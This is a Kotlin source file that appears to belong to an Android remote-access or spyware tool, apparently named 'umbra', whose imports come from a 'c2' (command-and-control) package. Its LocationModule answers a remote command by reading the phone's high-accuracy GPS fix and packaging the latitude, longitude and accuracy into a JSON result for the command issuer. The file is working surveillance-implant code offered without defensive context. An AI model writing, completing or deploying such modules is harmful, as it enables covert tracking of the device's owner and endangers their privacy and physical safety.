package dev.yassine.umbra.modules

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.os.Looper
import androidx.core.content.ContextCompat
import com.google.android.gms.location.*
import dev.yassine.umbra.c2.Command
import dev.yassine.umbra.c2.CommandResult
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import kotlin.coroutines.resume

object LocationModule {

    private val json = Json { prettyPrint = false }

    suspend fun get(context: Context, cmd: Command): String {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            return json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "no_location_permission"))
        }

        return try {
            val client = LocationServices.getFusedLocationProviderClient(context)
            val location = withTimeoutOrNull(15_000L) {
                suspendCancellableCoroutine<Location?> { cont ->
                    client.getCurrentLocation(
                        Priority.PRIORITY_HIGH_ACCURACY, null
                    ).addOnSuccessListener { loc ->
                        cont.resume(loc)
                    }.addOnFailureListener {
                        cont.resume(null)
                    }
                }
            }

            if (location != null) {
                val data = """{"lat":${location.latitude},"lng":${location.longitude},"acc":${location.accuracy},"provider":"${location.provider}"}"""
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "ok", data))
            } else {
                json.encodeToString(CommandResult.serializer(),
                    CommandResult(cmd.cmd_id, "error", "", "location_timeout"))
            }
        } catch (e: Exception) {
            json.encodeToString(CommandResult.serializer(),
                CommandResult(cmd.cmd_id, "error", "", "location:${e.message}"))
        }
    }
}
